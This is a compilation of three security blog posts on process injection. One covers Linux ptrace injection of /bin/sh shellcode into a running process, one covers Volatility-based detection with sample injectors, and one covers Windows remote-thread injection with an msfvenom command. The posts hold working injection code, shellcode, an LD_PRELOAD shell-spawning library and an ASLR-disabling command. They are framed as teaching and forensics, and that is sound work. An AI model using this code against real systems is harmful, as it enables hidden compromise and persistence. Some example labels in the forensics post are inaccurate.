filename: c-process-injection-multif-20250909.txt
https://blog.hackingforce.com.br/en/linux-process-injection

Linux-Based Process Injection
Feb 12, 2024

Introduction
   Cybercriminals, or pentesters, will always attempt to obscure their presence on compromised systems
   in some way to make identification by detection and response mechanisms, users, and administrators as
   difficult as possible. Some of these techniques involve disguising themselves as a legitimate system
   process or manipulating a legitimate process in such a way that it becomes part of the malicious
   process persisted by the agent.

   The techniques mentioned in this brief article have many legitimate uses, such as patching running
   services; for example, if a critical service needs correction that cannot be terminated for some
   reason, an alternative is to make the correction in execution. Another situation is the debugging of
   failing processes, so with dynamic analysis, it may be easier to find the problem, such as poor
   memory management or incorrect use of pointers.

   However, from the moment it is possible to have such a level of interaction with a process, the
   malicious agent can abuse it in various ways to alter the execution flow, manipulating it to execute
   something that was not in the original instruction sequence, or it is possible to access data in
   memory, such as credentials and keys.

   This type of tactic is also commonly employed in actions known as in-memory injection; one process
   infects another by injecting instructions, creating a new malicious thread in this other service.
   Also known as a fileless attack, it focuses on manipulating values in memory, normally there is no
   need to employ other evasion techniques against anti-malware solutions, as there will hardly be an
   EDR (Endpoint Detection and Response) solution performing dynamic memory analysis of processes. The
   malicious code itself is not written to disk, which prevents static analysis.

   When deploying malware within the compromised server, such as an implant generated by C2 (Metasploit,
   Cobat Strike, Sliver, etc.), this malware must be initiated within the machine by a common executable
   file, or via another file acting as the first stage, which will abuse some functionality of other
   services/software to execute the malware (VBA, jscript, HTA, or C for shellcode execution), or then
   deployment in a template file that has the instructions somewhere in the binary (calc.exe as in any
   example). These models have some problems:
     * When the user closes the parent application, the implant will be terminated.
     * It may be easier for security software/blue teams to detect processes with suspicious behavior,
       such as an MS Word (or in our case Libre Office because it's Linux) making requests to domain X
       within a period, executing several different system calls and creating threads without any sense.

   To solve these problems, it may be interesting to migrate the implant to another process, such a
   process that is hardly terminated, or that has a behavior more aligned with the mode of operation and
   communication of the implant, thus creating good persistence on the server and creating a good
   disguise for the attacker's backdoor.

   Imagine injecting an implant (Beacon) that the callback form to the C2 (command and control server)
   is made via the HTTP protocol, this implant could be injected into an NGinx service as a worker, if
   NGinx is acting as a reverse proxy the normal behavior is making requests outwards, so it would be a
   good way to obfuscate communication.

How it is done in a Windows environment
   Using Linux-based operating systems, there are no ways to proceed with process injection as in
   Windows. Windows has many APIs for debugging purposes that, when abused, make the injection process
   very easy and safe, without corrupting the target process.

   The main functions, often abused by malware within the Windows environment are described below;
   OpenProcess used in the action of opening/attaching to an existing remote process for interaction.
   VirtuallAllocEx is the expanded VirtualAlloc API, this call can allocate a number n of bytes in the
   attached process. WriteProcessMemory allows copying data to the remote process, the data (e.g.,
   shellcode) are written in the previously allocated space. And finally, CreateRemoteThread which will
   create a new thread in the remote process, this should execute the new code. Anyone wanting to hide
   under a legitimate process will abuse these APIs to achieve complete disguise. There are many other
   Windows API functions (including undocumented ones) for each action that can be used when trying to
   obfuscate the calls, as these mentioned functions are easily flagged by antivirus solutions.

   The order of execution of the functions is well determined, any malware that uses the technique will
   have this same chain of functions regardless of the programming language employed. This makes
   detection trivial.

   Note that, for every need, there is a function to do the job, such as memory allocation and creation
   of a new thread, in Linux (or UNIX-like systems) there is only one exported kernel API function
   called ptrace which is used to meet all the needs in debugging a process.

Other ways to inject instructions into Linux
   The LD_PRELOAD environment variable allows the loading of dynamic libraries at process startup

   , the functions exported by the library have priority over the original dependencies, this allows
   overwriting a function with code that alters the original behavior of the program.

   The technique has several limitations:
     * It will work only to overwrite common libraries.
     * It does not work for a statically linked binary or not using the standard library.
     * It does not work for binaries with SUID.
     * The library configuration can only occur at the start of the process.

   Another common way would be with the use of some software for debugging, like GNU Debugger. It must
   be coupled to the target process, which allows executing C format codes in this process. It is
   possible to use inline assembly to execute the instructions in the process, such as in the following
   example, which will execute /bin/bash in the target process, enabling something similar to a process
   hollowing.

register char *x asm("%rdi") = "/bin/bash"; asm(
                "xor %rsi,%rsi;" // Clear content of reg rsi
                "xor %rdx,%rdx;" // Clear content of reg rdx
                "mov $59,%rax;"  // Move 59 (execve) to rax
                "syscall;");     // Pass execution to the kernel


   The problem is that it would be necessary to have GDB operating on the compromised machine.
   Installing it may become an opsec problem.

   So, let's use ptrace.

Syscall ptrace
   The system call ptrace gives a process, which uses it, the ability to observe and control the
   execution of another process. This process that starts monitoring is called tracer, the process being
   monitored is called tracee.

long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);


   ----------------------------------------------------------------------------------------
   NR    Syscall   RAX    RDI            RSI        RDX                  R10
   ----------------------------------------------------------------------------------------
   101   ptrace    0x65   Long Request   Long Pid   Unsigned Long addr   Unsigned Long Data
   ----------------------------------------------------------------------------------------

   The tracer has a broad capacity for manipulation over the tracee process, enabling the reading and
   editing of registers, changing data at memory addresses allocated by the tracee and, consequently,
   manipulating the execution flow of the tracee process. ptrace is implemented in the kernel so it has
   full access to the task_struct process structure.

   The ptrace function must receive an action as the first argument, this action will dictate the type
   of interaction with the tracee process. The first action is which will couple the tracer to the
   tracee, PTRACE_ATTACH serves to couple to a thread of the process, if the process is multi-threaded
   it is necessary to couple individually.

Implementations
   Many common Linux programs and utilities use ptrace to help system administrators have more control
   over process execution and direct troubleshooting, for example, the strace which serves to monitor
   system calls.

   We can look at strace working, applying tracing to a process we can manipulate, in this case, python.
   For this, I just started a REPL (Read Eval Print Loop) and executed the strace command for the
   process id created by python, filtering by the openat call. Without the filtering, the output would
   be extremely messy, almost impossible to find what we want.

$> python3
Python 3.8.10 (default, Mar 13 2023, 10:26:41)
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> open("./history.txt","rb")
<_io.BufferedReader name='./history.txt'>


   Right after opening the file, a new line was shown captured by ptrace, with the system call and the
   arguments used.
$> strace -e openat -p 3330
strace: Process 3330 attached
openat(AT_FDCWD, "./history.txt", O_RDONLY|O_CLOEXEC) = 3

   It is possible to see that the function returned the file descriptor 3, which was created and now
   holds the content of the opened file.

Changing a string in memory
   This example aims to change a string in another process (the tracee), for this to be possible it is
   necessary to have the memory address of that string, where it is allocated in the remote process, in
   addition to the process id.

   The complete code of both programs can be found on
   [https://github.com/farinap5/linux-injection/tree/main/process_injection]github.

   The following code, which will be used as the target process, starts by allocating 5 bytes in the heap, a
   string of the same size will be copied to this memory space, and then the information will be shown on the
   terminal, the allocated string and the memory address offset of the string. This address will be important,
   as the modification of the bytes will be done from it.

   Perhaps, disabling ASLR would make the process simpler, turning off address randomization.
   echo 0 > /proc/sys/kernel/randomize_va_space

   The code needs to pause in some way to run the other program, which will do the injection, and then
   proceed to show the result, whether the string was changed or not. To pause the program there is a
   scanf waiting for a digit, this can be used later.

   Content of the proc.c file.
char *m = (char *)malloc(5 * sizeof(char));
strcpy(m, "hello");
int n;
printf("%s - %p\\n", m, m);
scanf("%d", &n);
printf("%s - %p\\n", m, m);

   Running this code, the following data is directed to the output. The process is now waiting for
   input.
$> ./proc
hello - 0x55c1e3bfd2a0


   Now we need the process ID.
30698 pts/1    S+     0:00 ./proc

   The other code is which will do the injection into the process. It declares a pid_t type variable to
   receive the process ID and an array of chars to receive the address where the string is allocated in
   the target process. Finally, it declares the message that will be written in the remote process, and
   the length of this message.

pid_t pid = 30698;
char *p = "0x55c1e3bfd2a0";
char *m = "mundo\\0";
int mlen = (int)strlen(m)

   Some messages to debug the actions, this typecasting would not be necessary.
printf("Remote data pointer: %p\\n", (void *)address);
printf("Local data pointer:  %p\\n", (void *)m);

   The variable p has a memory address in the format of an array of chars, for this to be used to locate
   the string that will be modified, it is necessary to convert it to a pointer, so strtoull() returns
   an unsigned long long value represented in the string. This can now be used when passing the
   destination address to ptrace().

unsigned long long address = strtoull(p, NULL, 16);

   After the declarations and conversions that will be used in the course of execution, it is possible
   to attach to the process using the ID.

ptrace(PTRACE_ATTACH, pid, NULL,NULL)

   It is necessary to implement some method to wait for the process to respond, this is implemented in
   the final code.

   The following loop should take byte by byte of the message allocated in local memory, and copy it to
   the remote process increasing that memory address collected. Both memory addresses are incremented
   equivalently.

   This copying process in this case is done with the PTRACE_POKEDATA action. The third argument
   receives the memory address that will be altered in the target process, and the fourth argument is
   about the data.

   The data is passed as void pointer type so that the information is accessed as a byte, without, type
   assignment, it could be a char as well, keeping the original type.

for (int i = 0; i < mlen; i++, address++,m++) {
	printf("Write %p <- %p: %c\\n",(void *)address, m, *(int *)m);
	ptrace(PTRACE_POKEDATA, pid, (void *)address, *m)
}

   After the process is complete, it is already possible to detach from the target process.

ptrace(PTRACE_DETACH, pid, NULL, NULL) != 0)

   The following block presents a detailing of the data being transferred.
Remote data pointer: 0x55c1e3bfd2a0
Local data pointer:  0x555555556017
Write 0x55c1e3bfd2a0 <- 0x555555556017: m
Write 0x55c1e3bfd2a1 <- 0x555555556018: u
Write 0x55c1e3bfd2a2 <- 0x555555556019: n
Write 0x55c1e3bfd2a3 <- 0x55555555601a: d
Write 0x55c1e3bfd2a4 <- 0x555555

55601b: o

   Continuing the target process, it is possible to see that the string was completely replaced by the
   word "mundo".

1
mundo - 0x55c1e3bfd2a0

Executing code within a remote process
   This next example outlines a way to change the execution flow of the target process, and then execute
   arbitrary instructions, such as from shellcode.

   The first step to executing a certain sequence of instructions is to have these instructions
   available in the process's memory. In Linux, there is no function like VirtuallAllocEx, the closest
   way is using ptrace as in the previous example, copying data from address to address.

   Another issue is that, also, there is no function like CreateRemoteThread to create a new execution
   flow in the remote process. It is possible to substitute this function with ptrace, since there is an
   action to access the data of the registers, there is the memory address stored in the instruction
   pointer that references the instruction (in machine code) that will be executed. With the
   PTRACE_POKETEXT action, it should, therefore, inject the instructions in sequence in the next
   addresses that the instruction pointer will pass through. These injected instructions can execute a
   fork to create a new subprocess, or use some other tactic to create a new thread. After the data
   insertion, the process is continued, the instruction pointer goes through the written bytes, and the
   data is passed to the CPU.

   The first step is to attach to the process.

ptrace(PTRACE_ATTACH, pid, NULL, NULL);

   It is necessary to record the current state of the registers, the shellcode will change the value of
   each register, usually, the original value is not replaced, so to not corrupt the process the
   registers must be restored after the injection.

struct user_regs_struct regs;
ptrace(PTRACE_GETREGS, pid, NULL, &regs);

   The source and destination addresses are pointers of the unsigned 4-byte integer type, so 4
   instructions are passed at once.

   An iteration is made writing the bytes of the instructions, in the sequence of the instruction
   pointer address.

   The indexer i must be incremented 4 times for each iteration since it represents the bytes of the
   shellcode being copied, for each iteration 4 bytes are written, then there must be this jump to the
   next block. This prevents that, when the shellcode ends it does not continue copying data beyond the
   limit.

   In the repository code some prints were added to show the process.

uint32_t *s = (uint32_t *) shellcode;
uint32_t *d = (uint32_t *) regs.rip;

for (int i=0; i < shellcodeLen; i+=4, s++,d++) {
	ptrace(PTRACE_POKETEXT, target, d, *s);
}

   Finally, the registers are restored.

regs.rip += 2;
ptrace(PTRACE_SETREGS, target, NULL, &regs);

   And the process detached from the tracee.

ptrace(PTRACE_DETACH, target, NULL, NULL);

   To test this code I executed proc.c from the previous example. I found out the process ID is 19156.

$> ./a.out
hello - 0x564a603702a0

   As shellcode, I use a sequence of instructions to execute the command /bin/sh, of just 24 bytes.
0000000000000080 <_start>:
  000080:       50                      push   %rax
  000081:       48 31 d2                xor    %rdx,%rdx
  000084:       48 31 f6                xor    %rsi,%rsi
  000087:       48 bb 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f,%rbx
  00008e:       2f 73 68
  000091:       53                      push   %rbx
  000092:       54                      push   %rsp
  000093:       5f                      pop    %rdi
  000094:       b0 3b                   mov    $0x3b,%al
  000096:       0f 05                   syscall

push rax      ; Insert rax into the stack
xor  rdx, rdx ; Zeroes the content of rdx
xor  rsi, rsi ; Zeroes the content of rsi
mov  rbx,'/bin//sh' ; Moves the byte sequence to rbx
push rbx      ; Inserts rbx

 into the stack
push rsp      ; Inserts rsp into the stack (sp = stack pointer), pointing to rbx.
pop  rdi      ; Loads the top of the stack (rsp) into rdi, which will be "/bin/sh".
mov  al, 59   ; moves syscall execve into al.
syscall       ; passes execution to the OS which should use the syscall in al.


   The execve system call (59) receives as an argument rdi which should be the filename that the kernel
   will create the process on, rsi a pointer to an argument vector, and rdx which should be a pointer to
   an environment variable vector.

   After executing the tracer, the output was pasted in the following block. There were 6 copy actions,
   in which 4 bytes were injected into the tracee process.
Start injecting shellcode at 0x7f6ea3edcfd2
Writting from 0x55ddcee77056 - d2314850 to 0x7f6ea3edcfd2
Writting from 0x55ddcee7705a - 48f63148 to 0x7f6ea3edcfd6
Writting from 0x55ddcee7705e - 69622fbb to 0x7f6ea3edcfda
Writting from 0x55ddcee77062 - 732f2f6e to 0x7f6ea3edcfde
Writting from 0x55ddcee77066 - 5f545368 to 0x7f6ea3edcfe2
Writting from 0x55ddcee7706a - 50f3bb0 to 0x7f6ea3edcfe6
24 Bytes written
Continue from 0x7f6ea3edcfd4
Deataching from PID: 19156

   The process was continued and a shell is started in the target.

$> ./a.out
hello - 0x564a603702a0

$> ls
README.md  a.out  main.c  main1.c  proc.c

$> cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
...

   When the registers are restored, the instruction pointer returns to the top where now it is the
   offset of the shellcode. The execution is continued, the instruction pointer sweeps through the
   shellcode and executes it.

Conclusions
   In UNIX-based systems, there is not all the support for different process manipulation needs as in a
   Windows environment, but it is still possible to rely on the ptrace function to meet the needs. The
   instruction injection techniques need to be much more elaborated and, working in one architecture,
   may not work in another, making it somewhat unstable, which is why we do not see major
   post-exploitation tools supporting process migration, for example, in many cases it may not work, and
   worse, it may corrupt the target process, becoming a more critical problem.

   This article serves as an introduction to the technique. As mentioned, I believe that process
   injection in Linux is underdeveloped, so I would like to build something more solid to eventually add
   to the post-exploitation tools the ability to migrate and spawn in a remote process, as is well
   developed by C2 tools when operating in Windows. Possibly, the next article will be about injecting
   object files or shared libraries, but for that to be possible, the foundation has to be very well
   understood.


---
https://unclesp1d3r.github.io/posts/2024/07/advanced-memory-forensics-detecting-code-injection-techniques-in-linux/

Advanced Memory Forensics - Detecting Code Injection Techniques in Linux
July 9, 2024

   Hey there, fellow hackers! Welcome to another deep dive into the dark and fascinating world of memory
   forensics. Today, we're going to explore advanced techniques for detecting code injection on Linux
   systems. Code injection is one of the most insidious methods attackers use to hide malicious
   activities and maintain persistence on compromised systems. By understanding these techniques, we can
   better defend against them and improve our forensics skills.

   Memory forensics is a critical skill for red teams and pen testers, as it allows us to uncover the
   traces left by advanced adversaries. We'll walk through several real-world examples, show you how to
   detect these techniques, and provide you with practical code samples and tool execution
   demonstrations. Let's get started!

What is Code Injection?
   Code injection involves injecting malicious code into the memory space of a running process. This can
   be done through various methods, including:
     * Shellcode Injection: Injecting custom shellcode into a process.
     * Library Injection: Loading a malicious shared library into a process.
     * Process Hollowing: Replacing the legitimate code of a process with malicious code.
     * Reflective DLL Injection: Injecting and executing a DLL without touching the disk.

   These techniques are used by attackers to execute arbitrary code, evade detection, and maintain
   persistence on compromised systems. As defenders, it's crucial to understand how these techniques
   work and how to detect them using memory forensics.

Tools of the Trade
   Before we dive into the techniques, let's talk about the tools we'll be using. Memory forensics
   requires specialized tools to analyze the contents of RAM. Here are some of the tools we'll be using:
     * Volatility: A powerful memory forensics framework.
     * Rekall: Another memory forensics framework, with a strong focus on scalability.
     * LiME: A Loadable Kernel Module (LKM) that allows you to acquire memory dumps from Linux systems.
     * GDB: The GNU Debugger, useful for low-level analysis of running processes.

   These tools will help us extract and analyze the memory contents of a compromised system, allowing us
   to detect signs of code injection.

Shellcode Injection
   Shellcode injection involves injecting custom shellcode into a running process. This is a common
   technique used by attackers to execute arbitrary code. Let's look at an example of how this is done
   and how we can detect it.

Example: Shellcode Injection
   Consider a scenario where an attacker injects shellcode into a running process using the ptrace
   system call. Here's a simple example of shellcode injection in C:

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

const char *shellcode = "\x48\x31\xc0\x48\x89\xc2\x48\x89"
                        "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
                        "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
                        "\x2f\x73\x68\x00\xcc";

void inject_shellcode(pid_t pid) {
	for (size_t i = 0; i < strlen(shellcode); i++) {
		ptrace(PTRACE_POKETEXT, pid, (void *)(0x00400000 + i), *((int *)(shellcode + i)));
	}
}

int main(int argc, char *argv[]) {
	pid_t pid;

	if (argc != 2) {
		fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
		return 1;
	}

	pid = atoi(argv[1]);
	ptrace(PTRACE_ATTACH, pid, NULL, NULL);
	wait(NULL);

	inject_shellcode(pid);

	ptrace(PTRACE_DETACH, pid, NULL, NULL);
	return 0;
}

   This program attaches to a running process, injects shellcode into its memory space, and then
   detaches. The shellcode spawns a /bin/sh shell.

Detecting Shellcode Injection
   To detect shellcode injection, we need to analyze the memory of the target process. Here's how we can
   do it using Volatility:
    1. Acquire a Memory Dump: First, we need to acquire a memory dump from the target system. We can use
       LiME to do this:

insmod lime.ko "path=/root/memory_dump.lime format=lime"

    2. Analyze the Memory Dump: Next, we load the memory dump into Volatility and analyze it:

volatility -f /root/memory_dump.lime --profile=LinuxUbuntu_18_04x64 linux_pslist

   This command lists all running processes. We need to find the target process (e.g., a web server) and
   its PID.

    3. Dump the Process Memory: We then dump the memory of the target process:

volatility -f /root/memory_dump.lime --profile=LinuxUbuntu_18_04x64 linux_dump_map -p <pid> -D /root/

    4. Analyze the Dumped Memory: Finally, we analyze the dumped memory for signs of shellcode. We can
       use strings to search for suspicious strings or use a disassembler like objdump to disassemble
       the dumped memory:

strings /root/task.1040.0x0000000000400000-0x0000000000600000.dmp | grep -i "bin/sh"

   If we find references to /bin/sh or other suspicious strings, it indicates possible shellcode
   injection.

Library Injection
   Library injection involves loading a malicious shared library into a running process. This can be
   done using the LD_PRELOAD environment variable, the dlopen function, or other methods. Let's explore
   an example and how to detect it.

Example: Library Injection
   Consider a scenario where an attacker injects a malicious library into a running process using
   LD_PRELOAD:

#include <stdio.h>
#include <stdlib.h>

void __attribute__((constructor)) init() {
	system("/bin/sh");
}

void __attribute__((destructor)) cleanup() {
	system("echo 'Library unloaded'");
}

   This library spawns a shell when loaded. The attacker can inject it into a process by setting the
   LD_PRELOAD environment variable:

LD_PRELOAD=/path/to/malicious.so /path/to/target

Detecting Library Injection
   To detect library injection, we need to examine the loaded libraries of a process. Here's how we can
   do it using Volatility:
    1. Acquire a Memory Dump: As before, we acquire a memory dump using LiME.
    2. List Loaded Libraries: We use Volatility to list the loaded libraries of the target process:

volatility -f /root/memory_dump.lime --profile=LinuxUbuntu_18_04x64 linux_library_list -p <pid>

   This command lists all libraries loaded by the target process. We need to look for suspicious or
   unexpected libraries.

    3. Analyze Loaded Libraries: We can further analyze the suspicious libraries by dumping and
       examining their contents:

volatility -f /root/memory_dump.lime --profile=LinuxUbuntu_18_04x64 linux_library_dump -p <pid> -b \
	<base_address> -D /root/

   We then use tools like strings, objdump, or gdb to analyze the dumped library.

Process Hollowing
   Process hollowing involves creating a new process in a suspended state, replacing its memory with
   malicious code, and then resuming the process. This technique is often used to hide malicious
   activities under the guise of a legitimate process.

Example: Process Hollowing
   Consider a scenario where an attacker uses process hollowing to replace the memory of a legitimate
   process with malicious code. Here's a simplified example:

#include <windows.h>
#include <stdio.h>

int main() {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	CONTEXT ctx;
	LPVOID baseAddr;
	char buffer[] = "Hello, Process Hollowing!";

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	memset(&pi, 0, sizeof(pi));

	// Create a new process in suspended state
	if (!CreateProcess(NULL, "notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("CreateProcess failed (%d).\n", GetLastError());
		return 1;
	}

	// Get the address of the entry point
	baseAddr = VirtualAllocEx(pi.hProcess, NULL, sizeof(buffer),
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pi.hProcess, baseAddr, buffer, sizeof(buffer), NULL);

	// Set the context of the process to point to our buffer
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi.hThread, &ctx);
	ctx.Eip = (DWORD)baseAddr;
	SetThreadContext(pi.hThread, &ctx);

	// Resume the process
	ResumeThread(pi.hThread);

	WaitForSingleObject(pi.hProcess, INFINITE);

	// Clean up
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return 0;
}

   This program creates a new process (notepad.exe) in a suspended state, allocates memory in the target
   process, writes a message to it, and then resumes the process. The target process now executes our
   malicious code.

Detecting Process Hollowing
   Detecting process hollowing involves examining the memory regions of a process and looking for
   anomalies. Here's how we can do it using Volatility:
    1. Acquire a Memory Dump: As before, we acquire a memory dump using LiME.
    2. List Memory Regions: We use Volatility to list the memory regions of the target process:

volatility -f /root/memory_dump.lime --profile=LinuxUbuntu_18_04x64 linux_vma_cache -p <pid>

   This command lists all memory regions of the target process. We need to look for regions that have
   suspicious permissions (e.g., executable but not readable) or regions that should not be there.

    3. Analyze Memory Regions: We can further analyze the suspicious memory regions by dumping and
       examining their contents:

volatility -f /root/memory_dump.lime --profile=LinuxUbuntu_18_04x64 linux_dump_map -p <pid> -b \
	<base_address>i -D /root/

   We then use tools like strings, objdump, or gdb to analyze the dumped memory.

Reflective DLL Injection
   Reflective DLL injection involves injecting a DLL into a process and executing it without touching
   the disk. This technique is often used by advanced attackers to evade detection by traditional
   file-based antivirus solutions.

Example: Reflective DLL Injection
   Consider a scenario where an attacker injects a DLL into a running process using reflective DLL
   injection. Here's a simplified example in C++:

#include <windows.h>
#include <stdio.h>

BOOL InjectDLL(DWORD pid, const char *dllPath) {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!hProcess) {
		printf("OpenProcess failed (%d).\n", GetLastError());
		return FALSE;
	}

	LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)dllPath, strlen(dllPath) + 1, NULL);

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
		(LPTHREAD_START_ROUTINE)LoadLibraryA, pRemoteBuf, 0, NULL);
	if (!hThread) {
		printf("CreateRemoteThread failed (%d).\n", GetLastError());
		CloseHandle(hProcess);
		return FALSE;
	}

	WaitForSingleObject(hThread, INFINITE);

	VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return TRUE;
}

int main(int argc, char *argv[]) {
	if (argc != 3) {
		fprintf(stderr, "Usage: %s <pid> <dll_path>\n", argv[0]);
		return 1;
	}

	DWORD pid = atoi(argv[1]);
	const char *dllPath = argv[2];

	if (InjectDLL(pid, dllPath)) {
		printf("DLL injected successfully.\n");
	} else {
		printf("DLL injection failed.\n");
	}

	return 0;
}

   This program injects a DLL into a running process by creating a remote thread that calls
   LoadLibraryA.

Detecting Reflective DLL Injection
   Detecting reflective DLL injection involves examining the memory of a process for injected modules.
   Here's how we can do it using Volatility:
    1. Acquire a Memory Dump: As before, we acquire a memory dump using LiME.
    2. List Loaded Modules: We use Volatility to list the loaded modules of the target process:

volatility -f /root/memory_dump.lime --profile=LinuxUbuntu_18_04x64 linux_library_list -p <pid>

   This command lists all modules loaded by the target process. We need to look for suspicious or
   unexpected modules.

    3. Analyze Loaded Modules: We can further analyze the suspicious modules by dumping and examining
       their contents:

volatility -f /root/memory_dump.lime --profile=LinuxUbuntu_18_04x64 linux_library_dump -p <pid> -b \
	<base_address> -D /root/

   We then use tools like strings, objdump, or gdb to analyze the dumped module.

Real-World Examples
   Let's look at some real-world examples of code injection techniques used by malware and advanced
   persistent threats (APTs).

Example 1: Turla
   Turla is an advanced APT group known for its sophisticated malware and code injection techniques. One
   of their tools, Carbon, uses reflective DLL injection to evade detection. Carbon injects a DLL into a
   legitimate process and uses it to execute its malicious payload.

Example 2: Stuxnet
   Stuxnet, one of the most famous pieces of malware, used process hollowing to hide its malicious
   activities. It injected code into legitimate processes and executed it, making it difficult to detect
   and analyze.

Example 3: Flame
   Flame, another sophisticated piece of malware, used shellcode injection to execute its payload. It
   injected shellcode into running processes, allowing it to carry out its malicious activities without
   being detected.

Conclusion
   Detecting code injection techniques in Linux requires a deep understanding of memory forensics and
   the ability to analyze the memory of a compromised system. By using tools like Volatility, Rekall,
   and GDB, we can uncover the traces left by advanced attackers and defend against their techniques.

   In this article, we explored several code injection techniques, including shellcode injection,
   library injection, process hollowing, and reflective DLL injection. We also looked at real-world
   examples of malware that use these techniques and provided practical examples of how to detect them.

   Memory forensics is a powerful skill for red teams and pen testers. By mastering these techniques, we
   can improve our ability to detect and respond to advanced threats. Keep exploring, stay curious, and
   never stop learning!

   Happy hacking!


---
https://www.stackzero.net/process-injection-by-example/

Process Injection By Example: The Complete Guide
January 24, 2024

   As a malware analyst, understanding a malware developer's mind is critical.
   In malware development one of the most effective techniques cybercriminals employ is process
   injection. This method has become increasingly prevalent, especially in advanced persistent threats
   (APTs) and sophisticated malware campaigns. Its ability to covertly manipulate and exploit system
   processes makes it a favoured tool for attackers seeking to bypass security defences and maintain a
   stealthy presence within a target system.

Understanding Process Injection
   Process injection hides malware in normal computer processes, a trick that often slips past common
   security tools like antivirus programs. This makes detecting and stopping it a challenge.

   In a [https://www.stackzero.net/how-to-embed-a-shellcode-payload-into-an-executable/]previous article on
   StackZero, we explored how to run shellcode in a local process. The key difference now is that we'll do the
   same but in a remote process. The goal of this guide is to help malware experts spot these hidden methods
   in actual malware. By learning through practical examples, they can better identify and combat these
   stealthy threats early in their
   [https://www.stackzero.net/what-is-malware-analysis-and-why-is-it-important/]malware analysis operations.

Why Cybercriminals Favor Process Injection
   Process injection offers several advantages to cybercriminals:
    1. Stealth and Evasion: By executing within legitimate processes, the malicious code can avoid
       detection by most antivirus and monitoring systems, which typically scan for suspicious
       standalone processes.
    2. Privilege Escalation: Many system processes have elevated privileges. By injecting into these
       processes, malware can gain higher access levels, enabling more extensive control over the
       system.
    3. Persistence: Process injection can help malware maintain a persistent presence on a system, even
       surviving reboots in some cases.
    4. Access to Sensitive Data: Operating within a legitimate process, especially those integral to the
       operating system or commonly used applications, allows the malware to access sensitive
       information unnoticed.

The Implications for Cybersecurity
   The sophisticated nature of process injection poses significant challenges for cybersecurity
   professionals. It highlights the need for advanced detection methods and the continual evolution of
   defensive strategies. Understanding the mechanics of process injection is a crucial step in
   developing more resilient and adaptive cybersecurity defences.

The Aim of This Article
   This article seeks to demystify process injection, explaining how it works and why malware developers
   use it so widely. We will delve into code analysis of a practical and minimal example. We aim to
   equip malware analysts with the knowledge to identify and combat this prevalent threat.

   It will be a toy example that you will never see in the real world, due to the ease with which it
   would be detected.

   Stay with us as we explore the intricate world of process injection, uncovering the strategies used
   by cybercriminals and the countermeasures essential for robust cyber defence.

Process Injection At a High Level
   This technique consists of 5 steps doable in several ways:
    1. Process Enumeration: Initially, we enumerate all running processes to locate the target process
       for injection.
    2. Memory Allocation: Next, we allocate memory within the target process's address space
       specifically for hosting our payload.
    3. Writing the Payload: Following allocation, we're writing the payload into the newly allocated
       memory region within the target process.
    4. Adjusting Memory Permissions: We then modify the memory permissions to make the payload
       executable. It's important to note that setting the memory to PAGE_EXECUTE_READWRITE can often
       trigger more defensive mechanisms, hence a more cautious approach is generally PAGE_EXECUTE_READ.
    5. Executing the Payload: Finally, we create a remote thread within the target process, initiating
       the malicious code.

Process Enumeration: The Starting Point
   CreateToolhelp32Snapshot: We use CreateToolhelp32Snapshot for process enumeration. This method is
   simple and easy to grasp, ideal for educational purposes. While it might trigger some defence systems
   due to its common use in malicious activities, its clarity in illustrating the process makes it a
   fitting choice for our discussion.

Memory Allocation: Securing Space for Malware
   VirtualAllocEx: Once you identify a target process, the next step is to allocate memory within
   that process's space. This is where VirtualAllocEx comes into play. It reserves a region of memory
   within the virtual address space of the target process, setting the stage for the malicious code and
   injecting it. This function is crucial as it determines where the code will reside and ensures the
   allocation of sufficient space.

Memory Modification: Planting the Malicious Code
   WriteProcessMemory: After securing memory space, the next move is to write the malicious code
   into this newly allocated area. This is achieved throughWriteProcessMemory, a function that copies
   the code from the attacker's process into the allocated space in the target process. This step is
   delicate and requires precision, as any error in writing the code could lead to detection or failure
   of the injection.

Altering Memory Protections: Setting the Stage for Execution
   VirtualProtectEx: Following the successful placement of the code, the memory protection of the
   allocated space needs to be modified to execute the code. VirtualProtectEx changes the memory
   protection of the allocated region, typically to PAGE_EXECUTE_READ, allowing the code to be executed.
   This step is vital for transitioning the injected code from a dormant state to an active one, ready
   for execution.

Remote Thread Creation: Activating the Malware
   CreateRemoteThread: The final step in the process injection is creating a new thread within the
   target process. CreateRemoteThread is used for this purpose, initiating the execution of the
   malicious code within the target process's context. This is the culmination of the injection process,
   where the malware becomes operational, executing under the guise of a legitimate process.

   Sure, let's delve into a more detailed explanation of the code, which demonstrates the process
   injection technique in a Windows environment.

Getting The Shellcode
   Before diving into process injection, it's essential to first obtain the shellcode we'll use. In this
   case, we'll generate the shellcode using msfvenom, just as we did in the previous article on
   StackZero.

   But this time, we're going to use a message box payload (always remember to get the right payload in
   order to avoid crashing the target process, in this case we are targeting a 64-bit process)

$> msfvenom -p windows/x64/messagebox  TEXT='Hacked!' TITLE='Your Have Been Hacked' -f c

   -p windows/x64/messagebox: This option specifies the payload to generate. In this case, it's
   windows/x64/messagebox, which means you're generating shellcode for opening a message box on a 64-bit
   Windows system.

   --format c: This option specifies the output format for the generated shellcode. In this case, it's
   set to c, which means the output will be in C programming language format.

